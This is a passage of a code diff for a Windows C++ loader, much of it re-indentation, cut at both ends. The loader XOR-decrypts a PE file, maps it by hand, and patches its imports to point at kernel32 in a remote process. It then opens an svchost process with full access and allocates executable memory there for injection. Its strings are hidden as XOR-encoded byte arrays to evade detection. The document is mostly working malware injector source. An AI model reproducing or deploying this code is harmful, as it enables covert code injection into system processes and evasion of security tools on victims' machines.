+
+	// Read the binary data from the file into the byte array
+
+	DWORD bytesRead;
+
+	if (!ReadFile(hFile, byteArray, fileSize, &bytesRead, NULL)) {
+
+		MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 68; _fuckingstring[1] = 115; _fuckingstring[2] = 115; _fuckingstring[3] = 110; _fuckingstring[4] = 115; _fuckingstring[5] = 33; _fuckingstring[6] = 115; _fuckingstring[7] = 100; _fuckingstring[8] = 96; _fuckingstring[9] = 101; _fuckingstring[10] = 104; _fuckingstring[11] = 111; _fuckingstring[12] = 102; _fuckingstring[13] = 33; _fuckingstring[14] = 103; _fuckingstring[15] = 115; _fuckingstring[16] = 110; _fuckingstring[17] = 108; _fuckingstring[18] = 33; _fuckingstring[19] = 117; _fuckingstring[20] = 105; _fuckingstring[21] = 100; _fuckingstring[22] = 33; _fuckingstring[23] = 103; _fuckingstring[24] = 104; _fuckingstring[25] = 109; _fuckingstring[26] = 100; _fuckingstring[27] = 11; _fuckingstring[28] = 1; FBXorCrypt(_fuckingstring, 29);
+		fprintf(stderr, _fuckingstring);
+
+		CloseHandle(hFile);
+
+		free(byteArray);
+
+		return 1;
+
+	}
+
+
+
+	// Close the file handle
 
 	CloseHandle(hFile);
 
-	return 1;
 
-}
 
+	// Now byteArray contains the binary data from the file
 
 
-// Allocate memory for the byte array
 
-BYTE* byteArray = (BYTE*)malloc(fileSize);
+	MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 82; _fuckingstring[1] = 116; _fuckingstring[2] = 98; _fuckingstring[3] = 98; _fuckingstring[4] = 100; _fuckingstring[5] = 114; _fuckingstring[6] = 114; _fuckingstring[7] = 103; _fuckingstring[8] = 116; _fuckingstring[9] = 109; _fuckingstring[10] = 109; _fuckingstring[11] = 120; _fuckingstring[12] = 33; _fuckingstring[13] = 115; _fuckingstring[14] = 100; _fuckingstring[15] = 96; _fuckingstring[16] = 101; _fuckingstring[17] = 33; _fuckingstring[18] = 36; _fuckingstring[19] = 109; _fuckingstring[20] = 116; _fuckingstring[21] = 33; _fuckingstring[22] = 99; _fuckingstring[23] = 120; _fuckingstring[24] = 117; _fuckingstring[25] = 100; _fuckingstring[26] = 114; _fuckingstring[27] = 33; _fuckingstring[28] = 103; _fuckingstring[29] = 115; _fuckingstring[30] = 110; _fuckingstring[31] = 108; _fuckingstring[32] = 33; _fuckingstring[33] = 117; _fuckingstring[34] = 105; _fuckingstring[35] = 100; _fuckingstring[36] = 33; _fuckingstring[37] = 103; _fuckingstring[38] = 104; _fuckingstring[39] = 109; _fuckingstring[40] = 100; _fuckingstring[41] = 59; _fuckingstring[42] = 33; _fuckingstring[43] = 36; _fuckingstring[44] = 114; _fuckingstring[45] = 11; _fuckingstring[46] = 1; FBXorCrypt(_fuckingstring, 47);
+	printf(_fuckingstring, bytesRead, filePath);
 
-if (byteArray == NULL) {
 
-	MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 68; _fuckingstring[1] = 115; _fuckingstring[2] = 115; _fuckingstring[3] = 110; _fuckingstring[4] = 115; _fuckingstring[5] = 33; _fuckingstring[6] = 96; _fuckingstring[7] = 109; _fuckingstring[8] = 109; _fuckingstring[9] = 110; _fuckingstring[10] = 98; _fuckingstring[11] = 96; _fuckingstring[12] = 117; _fuckingstring[13] = 104; _fuckingstring[14] = 111; _fuckingstring[15] = 102; _fuckingstring[16] = 33; _fuckingstring[17] = 108; _fuckingstring[18] = 100; _fuckingstring[19] = 108; _fuckingstring[20] = 110; _fuckingstring[21] = 115; _fuckingstring[22] = 120; _fuckingstring[23] = 11; _fuckingstring[24] = 1; FBXorCrypt(_fuckingstring, 25);
-	fprintf(stderr, _fuckingstring);
 
-	CloseHandle(hFile);
+	// Free the memory allocated for the byte array
 
-	return 1;
+	//free(byteArray);
 
-}
+	// byteArray
 
+	// key10key
 
+	//char _fuckingstring[100];
 
-// Read the binary data from the file into the byte array
+	MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 104; _fuckingstring[1] = 115; _fuckingstring[2] = 110; _fuckingstring[3] = 111; _fuckingstring[4] = 108; _fuckingstring[5] = 96; _fuckingstring[6] = 111; _fuckingstring[7] = 0; FBXorCrypt(_fuckingstring, 8);
 
-DWORD bytesRead;
+	for (int i = 0; i < fileSize; i++) {
 
-if (!ReadFile(hFile, byteArray, fileSize, &bytesRead, NULL)) {
+		byteArray[i] = byteArray[i] ^ (_fuckingstring[i % 7]);
 
-	MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 68; _fuckingstring[1] = 115; _fuckingstring[2] = 115; _fuckingstring[3] = 110; _fuckingstring[4] = 115; _fuckingstring[5] = 33; _fuckingstring[6] = 115; _fuckingstring[7] = 100; _fuckingstring[8] = 96; _fuckingstring[9] = 101; _fuckingstring[10] = 104; _fuckingstring[11] = 111; _fuckingstring[12] = 102; _fuckingstring[13] = 33; _fuckingstring[14] = 103; _fuckingstring[15] = 115; _fuckingstring[16] = 110; _fuckingstring[17] = 108; _fuckingstring[18] = 33; _fuckingstring[19] = 117; _fuckingstring[20] = 105; _fuckingstring[21] = 100; _fuckingstring[22] = 33; _fuckingstring[23] = 103; _fuckingstring[24] = 104; _fuckingstring[25] = 109; _fuckingstring[26] = 100; _fuckingstring[27] = 11; _fuckingstring[28] = 1; FBXorCrypt(_fuckingstring, 29);
-	fprintf(stderr, _fuckingstring);
+	}
 
-	CloseHandle(hFile);
 
-	free(byteArray);
 
-	return 1;
 
-}
 
 
 
-// Close the file handle
 
-CloseHandle(hFile);
 
 
 
-// Now byteArray contains the binary data from the file
+	// uiLibraryAddressPE
 
+	ULONG_PTR uiLibraryAddress = reinterpret_cast<DWORD64>(byteArray);
 
+	ULONG_PTR uiHeaderValue = uiLibraryAddress + ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_lfanew;
 
-MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 82; _fuckingstring[1] = 116; _fuckingstring[2] = 98; _fuckingstring[3] = 98; _fuckingstring[4] = 100; _fuckingstring[5] = 114; _fuckingstring[6] = 114; _fuckingstring[7] = 103; _fuckingstring[8] = 116; _fuckingstring[9] = 109; _fuckingstring[10] = 109; _fuckingstring[11] = 120; _fuckingstring[12] = 33; _fuckingstring[13] = 115; _fuckingstring[14] = 100; _fuckingstring[15] = 96; _fuckingstring[16] = 101; _fuckingstring[17] = 33; _fuckingstring[18] = 36; _fuckingstring[19] = 109; _fuckingstring[20] = 116; _fuckingstring[21] = 33; _fuckingstring[22] = 99; _fuckingstring[23] = 120; _fuckingstring[24] = 117; _fuckingstring[25] = 100; _fuckingstring[26] = 114; _fuckingstring[27] = 33; _fuckingstring[28] = 103; _fuckingstring[29] = 115; _fuckingstring[30] = 110; _fuckingstring[31] = 108; _fuckingstring[32] = 33; _fuckingstring[33] = 117; _fuckingstring[34] = 105; _fuckingstring[35] = 100; _fuckingstring[36] = 33; _fuckingstring[37] = 103; _fuckingstring[38] = 104; _fuckingstring[39] = 109; _fuckingstring[40] = 100; _fuckingstring[41] = 59; _fuckingstring[42] = 33; _fuckingstring[43] = 36; _fuckingstring[44] = 114; _fuckingstring[45] = 11; _fuckingstring[46] = 1; FBXorCrypt(_fuckingstring, 47);
-printf(_fuckingstring, bytesRead, filePath);
+	// optionalheadesizeofimage
 
+	ULONG_PTR uiBaseAddress = (ULONG_PTR)VirtualAlloc(NULL, ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 
 
-// Free the memory allocated for the byte array
 
-//free(byteArray);
+	DWORD64 _pe_addr_load_in_current_process = uiBaseAddress;
 
-// byteArray
 
-// key10key
 
-//char _fuckingstring[100];
+	DWORD _memeoy_size_to_be_allocated_in_target_process = ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.SizeOfImage;
 
-MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 104; _fuckingstring[1] = 115; _fuckingstring[2] = 110; _fuckingstring[3] = 111; _fuckingstring[4] = 108; _fuckingstring[5] = 96; _fuckingstring[6] = 111; _fuckingstring[7] = 0; FBXorCrypt(_fuckingstring, 8);
+	MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 49; _fuckingstring[1] = 121; _fuckingstring[2] = 36; _fuckingstring[3] = 113; _fuckingstring[4] = 33; _fuckingstring[5] = 99; _fuckingstring[6] = 120; _fuckingstring[7] = 117; _fuckingstring[8] = 100; _fuckingstring[9] = 114; _fuckingstring[10] = 33; _fuckingstring[11] = 118; _fuckingstring[12] = 104; _fuckingstring[13] = 109; _fuckingstring[14] = 109; _fuckingstring[15] = 33; _fuckingstring[16] = 99; _fuckingstring[17] = 100; _fuckingstring[18] = 33; _fuckingstring[19] = 96; _fuckingstring[20] = 109; _fuckingstring[21] = 109; _fuckingstring[22] = 110; _fuckingstring[23] = 98; _fuckingstring[24] = 96; _fuckingstring[25] = 117; _fuckingstring[26] = 100; _fuckingstring[27] = 101; _fuckingstring[28] = 33; _fuckingstring[29] = 104; _fuckingstring[30] = 111; _fuckingstring[31] = 33; _fuckingstring[32] = 117; _fuckingstring[33] = 96; _fuckingstring[34] = 115; _fuckingstring[35] = 102; _fuckingstring[36] = 100; _fuckingstring[37] = 117; _fuckingstring[38] = 33; _fuckingstring[39] = 113; _fuckingstring[40] = 115; _fuckingstring[41] = 110; _fuckingstring[42] = 98; _fuckingstring[43] = 100; _fuckingstring[44] = 114; _fuckingstring[45] = 114; _fuckingstring[46] = 11; _fuckingstring[47] = 1; FBXorCrypt(_fuckingstring, 48);
+	printf(_fuckingstring, reinterpret_cast<DWORD64*>((DWORD64)_memeoy_size_to_be_allocated_in_target_process));
 
-for (int i = 0; i < fileSize; i++) {
 
-	byteArray[i] = byteArray[i] ^ (_fuckingstring[i % 7]);
 
-}
+	ULONG_PTR uiValueA = ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.SizeOfHeaders;
 
-
-
-
-
-
-
-
-
-
-
-// uiLibraryAddressPE
-
-ULONG_PTR uiLibraryAddress = reinterpret_cast<DWORD64>(byteArray);
-
-ULONG_PTR uiHeaderValue = uiLibraryAddress + ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_lfanew;
-
-// optionalheadesizeofimage
-
-ULONG_PTR uiBaseAddress = (ULONG_PTR)VirtualAlloc(NULL, ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-
-
-
-DWORD64 _pe_addr_load_in_current_process = uiBaseAddress;
-
-
-
-DWORD _memeoy_size_to_be_allocated_in_target_process = ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.SizeOfImage;
-
-MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 49; _fuckingstring[1] = 121; _fuckingstring[2] = 36; _fuckingstring[3] = 113; _fuckingstring[4] = 33; _fuckingstring[5] = 99; _fuckingstring[6] = 120; _fuckingstring[7] = 117; _fuckingstring[8] = 100; _fuckingstring[9] = 114; _fuckingstring[10] = 33; _fuckingstring[11] = 118; _fuckingstring[12] = 104; _fuckingstring[13] = 109; _fuckingstring[14] = 109; _fuckingstring[15] = 33; _fuckingstring[16] = 99; _fuckingstring[17] = 100; _fuckingstring[18] = 33; _fuckingstring[19] = 96; _fuckingstring[20] = 109; _fuckingstring[21] = 109; _fuckingstring[22] = 110; _fuckingstring[23] = 98; _fuckingstring[24] = 96; _fuckingstring[25] = 117; _fuckingstring[26] = 100; _fuckingstring[27] = 101; _fuckingstring[28] = 33; _fuckingstring[29] = 104; _fuckingstring[30] = 111; _fuckingstring[31] = 33; _fuckingstring[32] = 117; _fuckingstring[33] = 96; _fuckingstring[34] = 115; _fuckingstring[35] = 102; _fuckingstring[36] = 100; _fuckingstring[37] = 117; _fuckingstring[38] = 33; _fuckingstring[39] = 113; _fuckingstring[40] = 115; _fuckingstring[41] = 110; _fuckingstring[42] = 98; _fuckingstring[43] = 100; _fuckingstring[44] = 114; _fuckingstring[45] = 114; _fuckingstring[46] = 11; _fuckingstring[47] = 1; FBXorCrypt(_fuckingstring, 48);
-printf(_fuckingstring, reinterpret_cast<DWORD64*>((DWORD64)_memeoy_size_to_be_allocated_in_target_process));
-
-
-
-ULONG_PTR uiValueA = ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.SizeOfHeaders;
-
-// uiLibraryAddress
-
-// 
-
-ULONG_PTR uiValueB = uiLibraryAddress;
-
-ULONG_PTR uiValueC = uiBaseAddress;//dll
-
-
-
-while (uiValueA--) // headersize
-
-*(BYTE*)uiValueC++ = *(BYTE*)uiValueB++;
-
-
-
-// STEP 3: load in all of our sections...
-
-// 
-
-// uiValueA = the VA of the first section
-
-// SizeOfOptionalHeadersize
-
-uiValueA = reinterpret_cast<DWORD64>(&(((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader)) + ((PIMAGE_NT_HEADERS)uiHeaderValue)->FileHeader.SizeOfOptionalHeader;// uiValueAsection header
-
-// 
-
-// itterate through all sections, loading them into memory.
-
-ULONG_PTR uiValueE = ((PIMAGE_NT_HEADERS)uiHeaderValue)->FileHeader.NumberOfSections;
-
-while (uiValueE--)
-
-{
-
-	// uiValueB is the VA for this section
-
-	uiValueB = (uiBaseAddress + ((PIMAGE_SECTION_HEADER)uiValueA)->VirtualAddress);// section header
-
-
-
-	// uiValueC is the VA for this sections data
+	// uiLibraryAddress
 
 	// 
 
-	uiValueC = (uiLibraryAddress + ((PIMAGE_SECTION_HEADER)uiValueA)->PointerToRawData);
+	ULONG_PTR uiValueB = uiLibraryAddress;
+
+	ULONG_PTR uiValueC = uiBaseAddress;//dll
 
 
 
-	// copy the section over
+	while (uiValueA--) // headersize
+
+		*(BYTE*)uiValueC++ = *(BYTE*)uiValueB++;
+
+
+
+	// STEP 3: load in all of our sections...
 
 	// 
 
-	ULONG_PTR	uiValueD = ((PIMAGE_SECTION_HEADER)uiValueA)->SizeOfRawData;
+	// uiValueA = the VA of the first section
 
+	// SizeOfOptionalHeadersize
 
+	uiValueA = reinterpret_cast<DWORD64>(&(((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader)) + ((PIMAGE_NT_HEADERS)uiHeaderValue)->FileHeader.SizeOfOptionalHeader;// uiValueAsection header
 
 	// 
 
-	while (uiValueD--)
+	// itterate through all sections, loading them into memory.
 
-		*(BYTE*)uiValueB++ = *(BYTE*)uiValueC++;
+	ULONG_PTR uiValueE = ((PIMAGE_NT_HEADERS)uiHeaderValue)->FileHeader.NumberOfSections;
 
-
-
-	// get the VA of the next section
-
-// 
-
-	uiValueA += sizeof(IMAGE_SECTION_HEADER);
-
-}
-
-
-
-
-
-// STEP 4: process our images import table...
-
-// dll   
-
-// dll
-
-
-
-// uiValueB = the address of the import directory
-
-// 
-
-uiValueB = (ULONG_PTR) & ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
-
-
-
-// we assume their is an import table to process
-
-// uiValueC is the first entry in the import table
-
-uiValueC = (uiBaseAddress + ((PIMAGE_DATA_DIRECTORY)uiValueB)->VirtualAddress);
-
-
-
-
-
-MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 106; _fuckingstring[1] = 100; _fuckingstring[2] = 115; _fuckingstring[3] = 111; _fuckingstring[4] = 100; _fuckingstring[5] = 109; _fuckingstring[6] = 50; _fuckingstring[7] = 51; _fuckingstring[8] = 47; _fuckingstring[9] = 101; _fuckingstring[10] = 109; _fuckingstring[11] = 109; _fuckingstring[12] = 1; FBXorCrypt(_fuckingstring, 13);
-DWORD64 _current_process_kern32_base_addr = reinterpret_cast<DWORD64>(GetModuleHandleA(_fuckingstring));
-
-// itterate through all imports
-
-while (((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->Name)
-
-{
-
-	// use LoadLibraryA to load the imported module into memory
-
-	//PEdll
-
-	// windowskernel32
-
-	// kernel32dllgetmodule
-
-	// uiLibraryAddress = (ULONG_PTR)LoadLibraryA((LPCSTR)(uiBaseAddress + ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->Name));
-
-	uiLibraryAddress = _current_process_kern32_base_addr;
-
-	// uiValueD = VA of the OriginalFirstThunk
-
-	DWORD64	uiValueD = (uiBaseAddress + ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->OriginalFirstThunk);
-
-
-
-	// uiValueA = VA of the IAT (via first thunk not origionalfirstthunk)
-
-	// thunkIAT
-
-	uiValueA = (uiBaseAddress + ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->FirstThunk);
-
-
-
-	// itterate through all imported functions, importing by ordinal if no name present
-
-	while (DEREF(uiValueA))
+	while (uiValueE--)
 
 	{
 
-		// sanity check uiValueD as some compilers only import by FirstThunk
+		// uiValueB is the VA for this section
 
-		// ordinalfuncname
+		uiValueB = (uiBaseAddress + ((PIMAGE_SECTION_HEADER)uiValueA)->VirtualAddress);// section header
 
 
 
-// uiValueDrvaImportLookupTable0x8000000000000000andordinal
+		// uiValueC is the VA for this sections data
 
-		if (uiValueD && ((PIMAGE_THUNK_DATA)uiValueD)->u1.Ordinal & IMAGE_ORDINAL_FLAG)
+		// 
 
-		{
+		uiValueC = (uiLibraryAddress + ((PIMAGE_SECTION_HEADER)uiValueA)->PointerToRawData);
 
-			// uiLibraryAddressDLLDLLNT Header
 
-			ULONG_PTR	uiExportDir = uiLibraryAddress + ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_lfanew;
 
+		// copy the section over
 
+		// 
 
-			// DLLDATA_DIRECTORY
+		ULONG_PTR	uiValueD = ((PIMAGE_SECTION_HEADER)uiValueA)->SizeOfRawData;
 
-			ULONG_PTR	uiNameArray = (ULONG_PTR) & ((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
 
 
+		// 
 
-			// DLL
+		while (uiValueD--)
 
-			uiExportDir = (uiLibraryAddress + ((PIMAGE_DATA_DIRECTORY)uiNameArray)->VirtualAddress);
+			*(BYTE*)uiValueB++ = *(BYTE*)uiValueC++;
 
 
 
-			// 
+		// get the VA of the next section
 
-			ULONG_PTR	uiAddressArray = (uiLibraryAddress + ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfFunctions);
+	// 
 
-
-
-			// ordinalbitordinal
-
-			// and0xFFFF16bitordinal
-
-			// ordinal valuebaseentry4bytes4DLL
-
-			// dlldll
-
-			uiAddressArray += ((IMAGE_ORDINAL(((PIMAGE_THUNK_DATA)uiValueD)->u1.Ordinal) - ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->Base) * sizeof(DWORD));
-
-
-
-			// +rvaImportAddressTable
-
-			// kernel32
-
-		//	DEREF(uiValueA) = (uiLibraryAddress + DEREF_32(uiAddressArray));
-
-			DEREF(uiValueA) = (_target_process_kernel32_base_addr + DEREF_32(uiAddressArray));
-
-		}
-
-		else
-
-		{
-
-			// bit0uiValueDIMAGE_IMPORT_BY_NAMErva
-
-			// PEIMAGE_IMPORT_BY_NAME
-
-			uiValueB = (uiBaseAddress + DEREF(uiValueD));
-
-
-
-			// GetProcAddressrvaImportAddressTable
-
-			//
-
-			// DEREF(uiValueA) = (ULONG_PTR)GetProcAddress((HMODULE)uiLibraryAddress, (LPCSTR)((PIMAGE_IMPORT_BY_NAME)uiValueB)->Name);
-
-#ifdef jinyongyutiaoshi
-
-			MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 103; _fuckingstring[1] = 116; _fuckingstring[2] = 111; _fuckingstring[3] = 98; _fuckingstring[4] = 117; _fuckingstring[5] = 104; _fuckingstring[6] = 110; _fuckingstring[7] = 111; _fuckingstring[8] = 33; _fuckingstring[9] = 111; _fuckingstring[10] = 96; _fuckingstring[11] = 108; _fuckingstring[12] = 100; _fuckingstring[13] = 33; _fuckingstring[14] = 104; _fuckingstring[15] = 114; _fuckingstring[16] = 59; _fuckingstring[17] = 33; _fuckingstring[18] = 36; _fuckingstring[19] = 114; _fuckingstring[20] = 11; _fuckingstring[21] = 1; FBXorCrypt(_fuckingstring, 22);
-			printf(_fuckingstring, ((PIMAGE_IMPORT_BY_NAME)uiValueB)->Name);
-
-#endif // jinyongyutiaoshi
-
-
-
-			DWORD64 _____ashdjoajoidais = (ULONG_PTR)GetProcAddress((HMODULE)uiLibraryAddress, (LPCSTR)((PIMAGE_IMPORT_BY_NAME)uiValueB)->Name);
-
-
-
-#ifdef jinyongyutiaoshi
-
-			MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 117; _fuckingstring[1] = 105; _fuckingstring[2] = 104; _fuckingstring[3] = 114; _fuckingstring[4] = 33; _fuckingstring[5] = 104; _fuckingstring[6] = 114; _fuckingstring[7] = 33; _fuckingstring[8] = 117; _fuckingstring[9] = 105; _fuckingstring[10] = 100; _fuckingstring[11] = 33; _fuckingstring[12] = 103; _fuckingstring[13] = 116; _fuckingstring[14] = 111; _fuckingstring[15] = 98; _fuckingstring[16] = 117; _fuckingstring[17] = 104; _fuckingstring[18] = 110; _fuckingstring[19] = 111; _fuckingstring[20] = 33; _fuckingstring[21] = 96; _fuckingstring[22] = 101; _fuckingstring[23] = 101; _fuckingstring[24] = 115; _fuckingstring[25] = 100; _fuckingstring[26] = 114; _fuckingstring[27] = 114; _fuckingstring[28] = 33; _fuckingstring[29] = 115; _fuckingstring[30] = 100; _fuckingstring[31] = 117; _fuckingstring[32] = 115; _fuckingstring[33] = 104; _fuckingstring[34] = 100; _fuckingstring[35] = 119; _fuckingstring[36] = 100; _fuckingstring[37] = 33; _fuckingstring[38] = 103; _fuckingstring[39] = 115; _fuckingstring[40] = 110; _fuckingstring[41] = 108; _fuckingstring[42] = 33; _fuckingstring[43] = 98; _fuckingstring[44] = 116; _fuckingstring[45] = 115; _fuckingstring[46] = 115; _fuckingstring[47] = 100; _fuckingstring[48] = 111; _fuckingstring[49] = 117; _fuckingstring[50] = 33; _fuckingstring[51] = 113; _fuckingstring[52] = 115; _fuckingstring[53] = 110; _fuckingstring[54] = 98; _fuckingstring[55] = 100; _fuckingstring[56] = 114; _fuckingstring[57] = 114; _fuckingstring[58] = 38; _fuckingstring[59] = 114; _fuckingstring[60] = 33; _fuckingstring[61] = 106; _fuckingstring[62] = 100; _fuckingstring[63] = 115; _fuckingstring[64] = 111; _fuckingstring[65] = 100; _fuckingstring[66] = 109; _fuckingstring[67] = 50; _fuckingstring[68] = 51; _fuckingstring[69] = 47; _fuckingstring[70] = 101; _fuckingstring[71] = 109; _fuckingstring[72] = 109; _fuckingstring[73] = 59; _fuckingstring[74] = 33; _fuckingstring[75] = 36; _fuckingstring[76] = 113; _fuckingstring[77] = 11; _fuckingstring[78] = 1; FBXorCrypt(_fuckingstring, 79);
-			printf(_fuckingstring, reinterpret_cast<BYTE*>(_____ashdjoajoidais));
-
-#endif // jinyongyutiaoshi
-
-			DWORD64 _tempoppapsdjioasdjhoiasjda = _____ashdjoajoidais - uiLibraryAddress + _target_process_kernel32_base_addr;
-
-#ifdef jinyongyutiaoshi
-
-			MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 117; _fuckingstring[1] = 105; _fuckingstring[2] = 104; _fuckingstring[3] = 114; _fuckingstring[4] = 33; _fuckingstring[5] = 104; _fuckingstring[6] = 114; _fuckingstring[7] = 33; _fuckingstring[8] = 117; _fuckingstring[9] = 105; _fuckingstring[10] = 100; _fuckingstring[11] = 33; _fuckingstring[12] = 103; _fuckingstring[13] = 116; _fuckingstring[14] = 111; _fuckingstring[15] = 98; _fuckingstring[16] = 117; _fuckingstring[17] = 104; _fuckingstring[18] = 110; _fuckingstring[19] = 111; _fuckingstring[20] = 33; _fuckingstring[21] = 96; _fuckingstring[22] = 101; _fuckingstring[23] = 101; _fuckingstring[24] = 115; _fuckingstring[25] = 100; _fuckingstring[26] = 114; _fuckingstring[27] = 114; _fuckingstring[28] = 33; _fuckingstring[29] = 96; _fuckingstring[30] = 103; _fuckingstring[31] = 117; _fuckingstring[32] = 100; _fuckingstring[33] = 115; _fuckingstring[34] = 33; _fuckingstring[35] = 103; _fuckingstring[36] = 104; _fuckingstring[37] = 121; _fuckingstring[38] = 100; _fuckingstring[39] = 101; _fuckingstring[40] = 33; _fuckingstring[41] = 104; _fuckingstring[42] = 111; _fuckingstring[43] = 33; _fuckingstring[44] = 117; _fuckingstring[45] = 96; _fuckingstring[46] = 115; _fuckingstring[47] = 102; _fuckingstring[48] = 100; _fuckingstring[49] = 117; _fuckingstring[50] = 33; _fuckingstring[51] = 113; _fuckingstring[52] = 115; _fuckingstring[53] = 110; _fuckingstring[54] = 98; _fuckingstring[55] = 100; _fuckingstring[56] = 114; _fuckingstring[57] = 114; _fuckingstring[58] = 59; _fuckingstring[59] = 33; _fuckingstring[60] = 36; _fuckingstring[61] = 113; _fuckingstring[62] = 11; _fuckingstring[63] = 1; FBXorCrypt(_fuckingstring, 64);
-			printf(_fuckingstring, reinterpret_cast<BYTE*>(_tempoppapsdjioasdjhoiasjda));
-
-#endif // jinyongyutiaoshi
-
-			* reinterpret_cast<DWORD64*>(uiValueA) = _tempoppapsdjioasdjhoiasjda;
-
-		}
-
-		// get the next imported function
-
-		uiValueA += sizeof(ULONG_PTR);
-
-		if (uiValueD)
-
-			uiValueD += sizeof(ULONG_PTR);
+		uiValueA += sizeof(IMAGE_SECTION_HEADER);
 
 	}
 
 
 
-	// get the next import
-
-	uiValueC += sizeof(IMAGE_IMPORT_DESCRIPTOR);
-
-}
 
 
+	// STEP 4: process our images import table...
 
-// STEP 5: process all of our images relocations...
+	// dll   
 
-// 
+	// dll
 
 
 
-// calculate the base address delta and perform relocations (even if we load at desired image base)
+	// uiValueB = the address of the import directory
 
-// daltadelta
+	// 
 
-
-
-
-
-HANDLE hw = OpenProcess(PROCESS_ALL_ACCESS, 0, _svchost_1_pid);
-
-if (!hw)
-
-{
-
-	MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 81; _fuckingstring[1] = 115; _fuckingstring[2] = 110; _fuckingstring[3] = 98; _fuckingstring[4] = 100; _fuckingstring[5] = 114; _fuckingstring[6] = 114; _fuckingstring[7] = 33; _fuckingstring[8] = 79; _fuckingstring[9] = 110; _fuckingstring[10] = 117; _fuckingstring[11] = 33; _fuckingstring[12] = 103; _fuckingstring[13] = 110; _fuckingstring[14] = 116; _fuckingstring[15] = 111; _fuckingstring[16] = 101; _fuckingstring[17] = 33; _fuckingstring[18] = 41; _fuckingstring[19] = 49; _fuckingstring[20] = 121; _fuckingstring[21] = 36; _fuckingstring[22] = 109; _fuckingstring[23] = 89; _fuckingstring[24] = 40; _fuckingstring[25] = 11; _fuckingstring[26] = 1; FBXorCrypt(_fuckingstring, 27);
-	printf(_fuckingstring, GetLastError());
-
-	return -1;
-
-}
-
-void* _real_base_in_target_process = VirtualAllocEx(hw, NULL, _memeoy_size_to_be_allocated_in_target_process, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	uiValueB = (ULONG_PTR) & ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
 
 
 
-// 	uiLibraryAddress = uiBaseAddress - ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.ImageBase;
+	// we assume their is an import table to process
 
-uiLibraryAddress = reinterpret_cast<DWORD64>(_real_base_in_target_process) - ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.ImageBase;
-
-
-
-// uiValueB = the address of the relocation directory
-
-// .reloc
-
-uiValueB = (ULONG_PTR) & ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
-
-
-
-// check if their are any relocations present
-
-if (((PIMAGE_DATA_DIRECTORY)uiValueB)->Size)
-
-{
-
-	// uiValueC is now the first entry (IMAGE_BASE_RELOCATION)
+	// uiValueC is the first entry in the import table
 
 	uiValueC = (uiBaseAddress + ((PIMAGE_DATA_DIRECTORY)uiValueB)->VirtualAddress);
 
 
 
-	// and we itterate through all entries...
 
-	while (((PIMAGE_BASE_RELOCATION)uiValueC)->SizeOfBlock)
+
+	MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 106; _fuckingstring[1] = 100; _fuckingstring[2] = 115; _fuckingstring[3] = 111; _fuckingstring[4] = 100; _fuckingstring[5] = 109; _fuckingstring[6] = 50; _fuckingstring[7] = 51; _fuckingstring[8] = 47; _fuckingstring[9] = 101; _fuckingstring[10] = 109; _fuckingstring[11] = 109; _fuckingstring[12] = 1; FBXorCrypt(_fuckingstring, 13);
+	DWORD64 _current_process_kern32_base_addr = reinterpret_cast<DWORD64>(GetModuleHandleA(_fuckingstring));
+
+	// itterate through all imports
+
+	while (((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->Name)
 
 	{
 
-#ifdef jinyongyutiaoshi
+		// use LoadLibraryA to load the imported module into memory
 
